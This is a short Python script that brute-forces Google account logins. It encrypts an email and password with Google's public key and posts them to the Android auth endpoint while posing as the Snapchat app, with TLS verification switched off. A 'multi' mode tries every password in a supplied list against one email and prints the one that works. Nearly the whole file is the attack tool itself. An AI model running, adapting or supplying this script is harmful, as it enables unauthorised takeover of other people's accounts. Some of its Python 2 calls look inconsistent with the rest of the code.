from hashlib import sha256, sha1, md5
from base64 import b64encode, b64decode
from binascii import unhexlify
import requests
from Crypto.Cipher import AES,PKCS1_OAEP
from Crypto.PublicKey import RSA
def encryptPassword(email, password):
    gdpk = "AAAAgMom/1a/v0lblO2Ubrt60J2gcuXSljGFQXgcyZWveWLEwo6prwgi3iJIZdodyhKZQrNWp5nKJ3srRXcUW+F1BD3baEVGcmEgqaLZUNBjm057pKRI16kB0YppeGx5qIQ5QjKzsR8ETQbKLNWgRY0QRNVz34kMJR3P/LgHax/6rmf5AAAAAwEAAQ=="
    binaryKey = b64decode(gdpk).encode('hex')
    half = binaryKey[8:264]
    modulus = long(half, 16)
    half = binaryKey[272:278]
    exponent = long(half, 16)
    sha1hash = sha1(b64decode(gdpk)).digest()
    signature = "00" + sha1hash[:4].encode('hex')
    key = RSA.construct((modulus, exponent))
    cipher = PKCS1_OAEP.new(key)
    plain = email + "\x00" + password
    encrypted = cipher.encrypt(plain).encode('hex')
    ste = signature + encrypted
    output = unhexlify(ste)
    encryptedPassword = b64encode(output).encode('ascii').replace("+","-").replace("/","_")
    return encryptedPassword
def login(email, password):
    encryptedPasswd = encryptPassword(email, password)
    postfields = {'device_country': 'us','operatorCountry': 'us','lang': 'en_US','sdk_version': '19','google_play_services_version': '7097038','accountType': 'HOSTED_OR_GOOGLE','Email': email,'service': 'audience:server:client_id:694893979329-l59f3phl42et9clpoo296d8raqoljl6p.apps.googleusercontent.com','source': 'android','androidId': '378c184c6070c26c','app': 'com.snapchat.android','client_sig': '49f6badb81d89a9e38d65de76f09355071bd67e7','callerPkg': 'com.snapchat.android','callerSig': '49f6badb81d89a9e38d65de76f09355071bd67e7','EncryptedPasswd': encryptedPasswd}
    headers = {'device': '378c184c6070c26c','app': 'com.snapchat.android','User-Agent': 'GoogleAuth/1.4 (mako JDQ39)','Accept-Encoding': 'gzip'}
    r = requests.post("https://android.clients.google.com/auth", headers=headers, data=postfields, verify=False)
    if r.status_code == 200:
        return True
    else:
        return r.text
if __name__ == "__main__":
	do = str(input("one/multi ?"))
	if do == "one":
		e = str(input("Email ?"))
		p = str(input("Pass ?"))
		print(login(e,p))
	elif do == "multi":
		e2 = str(input("Email ?"))
		pl = str(input("Pass List ?"))
		i = open(pl,'r').read().splitlines()
		for passwd in i:
			if login(e2,passwd) == True:
				print("Password is :"+passwd)
				exit()
			else:
				print(login(e2,passwd))
	else: exit()
